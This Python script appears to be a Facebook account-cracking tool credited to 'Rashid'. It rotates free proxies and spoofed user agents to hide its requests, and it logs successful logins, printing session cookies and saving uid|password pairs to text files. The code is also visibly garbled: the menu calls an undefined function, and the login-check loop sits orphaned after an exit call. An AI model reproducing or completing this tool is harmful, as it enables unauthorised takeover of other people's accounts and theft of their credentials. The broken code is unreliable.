#___Created By Rashid Sindhi Shar _______#
#_____I love You jana M 🤣😅___________#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_________country Proxy ____Rashid_____#
try:
    proxx=requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
    #_______user agent _____#
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
#__________Logo_____Rashid_____#
logo = ("""
\033[1;32m  _____           _     _     _ 
  |  __ \         | |   (_)   | |
  | |__) |__ _ ___| |__  _  __| |
  |  _  // _` / __| '_ \| |/ _` |
  | | \ \ (_| \__ \ | | | | (_| |
  |_|  \_\__,_|___/_| |_|_|\__,_|
[+]=================================
[+] CREATED BY   :  RASHID
[+] COUNTRY      :  PAKISTAN
[+] ON GITHUB    :  RASHID
[+] TOOL STATUS  :  RANDOM
[+] TOOL VERSION : .0.1
[+]===============================""")
  #_________Mthad________#
def Main():
        os.system("clear")
        print(logo)
        print(" [1] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊")
        print(" [0] 𝐄𝐗𝐈𝐓")
        RashidSindhi =input("\n [?] 𝐂𝐇𝐎𝐎𝐒𝐄 : ")
        if RashidSindhi in ["1","01"]:
            fuck()
        if RashidSindhi in [" 0", "00"]:
            exit()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;92m[RASHID-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/RASHID/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                open('/sdcard/RASHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
